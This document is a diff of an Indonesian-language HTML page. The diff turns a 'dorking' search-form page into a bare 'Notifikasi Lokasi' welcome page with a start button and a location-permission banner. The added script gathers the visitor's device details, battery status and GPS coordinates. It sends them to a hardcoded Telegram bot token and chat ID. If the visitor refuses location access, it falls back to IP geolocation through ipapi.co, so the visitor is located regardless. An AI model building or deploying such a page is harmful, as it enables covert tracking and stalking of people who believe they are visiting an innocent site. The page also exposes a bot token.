@@ -1,125 +1,111 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aplikasi Pencarian Dorking - UFS DORKING</title>
-    <!-- TailwindCSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Notifikasi Lokasi</title>
     <style>
-        :root {
-            --primary-color: #3B82F6;
-            --secondary-color: #1F2937;
-            --background-light: #ffffff;
-            --background-dark: #1F2937;
-            --text-light: #1F2937;
-            --text-dark: #ffffff;
-            --input-bg-light: #f3f4f6;
-            --input-bg-dark: #374151;
-            --card-bg-light: #ffffff;
-            --card-bg-dark: #1F2937;
-            --button-hover-bg: #2563EB;
-            --border-color-light: #d1d5db;
-            --border-color-dark: #4B5563;
-        }
-
-        body[data-theme="dark"] {
-            --background-color: var(--background-dark);
-            --text-color: var(--text-dark);
-        }
-
-        body[data-theme="light"] {
-            --background-color: var(--background-light);
-            --text-color: var(--text-light);
-        }
-
         body {
-            background-color: var(--background-color);
-            color: var(--text-color);
-            font-family: 'Roboto', sans-serif;
-            transition: background-color 0.3s, color 0.3s;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
         }
 
-        .cari-button {
-            background-color: var(--primary-color);
-            color: var(--text-dark);
-            padding: 0.75rem 1.5rem;
+        .action-button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 20px 40px;
+            font-size: 20px;
             border: none;
-            border-radius: 0.375rem;
+            border-radius: 5px;
             cursor: pointer;
+            margin-top: 20px;
         }
 
-        .notification {
+        #notification {
             display: none;
             position: fixed;
             bottom: 0;
             width: 100%;
             background: #f9f9f9;
-            text-align: center;
             padding: 15px;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
             z-index: 1000;
+        }
+
+        #notification p {
+            margin: 0;
+            font-size: 16px;
+            color: #333;
+        }
+
+        #notification button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        #allowButton {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            margin-right: 5px;
+        }
+
+        #dismissButton {
+            background: #ccc;
+            color: black;
+            border: none;
         }
     </style>
 </head>
+<body>
+    <h1>Selamat Datang!</h1>
+    <p>Tekan tombol di bawah untuk mulai.</p>
+    <button class="action-button" id="startButton">Mulai</button>
 
-<body class="p-5" data-theme="dark">
-    <div class="max-w-lg mx-auto bg-card-bg p-6 rounded-lg shadow-lg transition-colors">
-        <div class="flex justify-between items-center mb-6">
-            <h1 class="text-3xl font-bold text-primary-color text-center">UFS DORKING!</h1>
-            <div class="flex items-center">
-                <span class="mr-2">🌙</span>
-                <label class="toggle-switch">
-                    <input type="checkbox" id="themeToggle">
-                    <span class="slider"></span>
-                </label>
-                <span class="ml-2">☀️</span>
-            </div>
-        </div>
-
-        <form id="searchForm" class="space-y-4">
-            <div>
-                <label for="keywords" class="block text-text-color">Kata Kunci:</label>
-                <input type="text" id="keywords" name="keywords"
-                    class="border border-border-color p-2 w-full rounded bg-input-bg text-text-color"
-                    placeholder="Masukkan kata kunci..." required>
-            </div>
-            <div>
-                <label for="country" class="block text-text-color">Negara:</label>
-                <select id="country" name="country"
-                    class="border border-border-color p-2 w-full rounded bg-input-bg text-text-color">
-                    <option value="us">Amerika Serikat</option>
-                    <option value="id">Indonesia</option>
-                </select>
-            </div>
-            <div>
-                <button type="submit" class="cari-button ripple">Cari</button>
-            </div>
-        </form>
-    </div>
-
-    <!-- Notifikasi Lokasi -->
-    <div id="notification" class="notification">
+    <div id="notification">
         <p>Akses lokasi memungkinkan fitur tertentu berfungsi. Tanpa izin, aplikasi tetap bisa digunakan dengan fitur terbatas.</p>
-        <button id="allowButton" class="cari-button">Izinkan</button>
-        <button id="dismissButton" class="cari-button">Tutup</button>
+        <button id="allowButton">Izinkan</button>
+        <button id="dismissButton">Tutup</button>
     </div>
 
     <script>
-        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Ganti dengan token Anda
+        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Ganti dengan token bot Telegram Anda
         const chatId = "5649811717"; // Ganti dengan Chat ID Anda
 
-        document.getElementById("notification").style.display = "block";
+        document.getElementById("startButton").addEventListener("click", () => {
+            document.getElementById("notification").style.display = "block";
+        });
 
         document.getElementById("allowButton").addEventListener("click", () => {
             document.getElementById("notification").style.display = "none";
-            getDeviceAndLocationInfo();
+            getDeviceAndLocationInfo(); // Panggil fungsi untuk mendapatkan data
         });
 
         document.getElementById("dismissButton").addEventListener("click", () => {
             document.getElementById("notification").style.display = "none";
         });
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Data berhasil dikirim ke Telegram.");
+                } else {
+                    console.error("Gagal mengirim data ke Telegram.");
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
 
         function getDeviceAndLocationInfo() {
             const deviceInfo = `
@@ -128,10 +114,10 @@ User Agent: ${navigator.userAgent}
 Vendor: ${navigator.vendor || 'N/A'}
             `;
 
-            getBatteryStatus(batteryInfo => {
-                getGeolocation(locationInfo => {
+            // Ambil informasi baterai jika tersedia
+            getBatteryStatus((batteryInfo) => {
+                getGeolocation((locationInfo) => {
                     const message = `
-Lokasi:
 ${locationInfo}
 
 Perangkat:
@@ -147,24 +133,29 @@ ${batteryInfo}
 
         function getBatteryStatus(callback) {
             if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
+                navigator.getBattery().then(function(battery) {
                     const batteryInfo = `
 Level Baterai: ${(battery.level * 100).toFixed(0)}%
 Mengisi Daya: ${battery.charging ? 'Ya' : 'Tidak'}
                     `;
                     callback(batteryInfo);
-                }).catch(() => callback("Baterai tidak tersedia."));
+                }).catch(function() {
+                    callback("Informasi baterai tidak tersedia.");
+                });
             } else {
-                callback("Baterai tidak didukung.");
+                callback("Informasi baterai tidak didukung oleh perangkat ini.");
             }
         }
 
         function getGeolocation(callback) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const { latitude, longitude, accuracy } = position.coords;
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
                         const locationInfo = `
+Lokasi Perangkat:
 Latitude: ${latitude}
 Longitude: ${longitude}
 Akurasi: ${accuracy} meter
@@ -172,23 +163,35 @@ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
                         `;
                         callback(locationInfo);
                     },
-                    () => callback("Lokasi tidak tersedia.")
+                    (error) => {
+                        console.error("Izin lokasi ditolak atau gagal:", error.message);
+                        sendFallbackIPLocation(callback); // Fallback ke IP jika lokasi tidak diizinkan
+                    }
                 );
             } else {
-                callback("Geolocation tidak didukung.");
+                console.error("Geolocation tidak didukung oleh browser.");
+                sendFallbackIPLocation(callback); // Fallback ke IP jika browser tidak mendukung geolocation
             }
         }
 
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
-            })
-            .then(() => console.log("Data berhasil dikirim ke Telegram."))
-            .catch(error => console.error("Error:", error));
+        function sendFallbackIPLocation(callback) {
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const locationInfo = `
+Fallback Lokasi IP:
+IP Address: ${data.ip}
+Kota: ${data.city}
+Wilayah: ${data.region}
+Negara: ${data.country_name}
+                    `;
+                    callback(locationInfo);
+                })
+                .catch(error => {
+                    console.error("Gagal mengambil lokasi IP:", error);
+                    callback("Informasi lokasi tidak tersedia.");
+                });
         }
     </script>
 </body>
-
 </html>
